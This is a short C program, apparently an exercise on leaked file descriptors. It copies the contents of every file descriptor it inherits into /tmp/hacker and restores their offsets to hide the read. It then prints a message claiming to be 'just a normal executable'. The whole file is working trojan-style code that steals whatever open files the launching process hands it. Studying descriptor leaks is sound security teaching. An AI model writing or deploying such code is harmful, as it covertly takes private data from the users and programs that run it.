#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  for (long i = 3; i < max_fd; i++)
  {
    if(i == out) continue;
    
    char symlink_path[14 + 19 + 1];
    sprintf(symlink_path,"/proc/self/fd/%ld",i);
    
    if(faccessat(-1, symlink_path, F_OK, AT_SYMLINK_NOFOLLOW) < 0) continue;

    char symlink_value[PATH_MAX];
    Readlink(symlink_path, symlink_value, PATH_MAX);

    dprintf(out, "\nFile descriptor %ld is '%s' file!\n", i, symlink_value);

    off_t old_pos;
    if((old_pos = lseek(i, 0, SEEK_CUR)) == -1) continue;
    Lseek(i, 0, SEEK_SET);

    char buff[BUFSIZ];
    size_t read;
    while ((read = Read(i, buff, BUFSIZ)))
    {
      Write(out, buff, read);
    }
    
    Lseek(i, old_pos, SEEK_SET);
  }
  

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
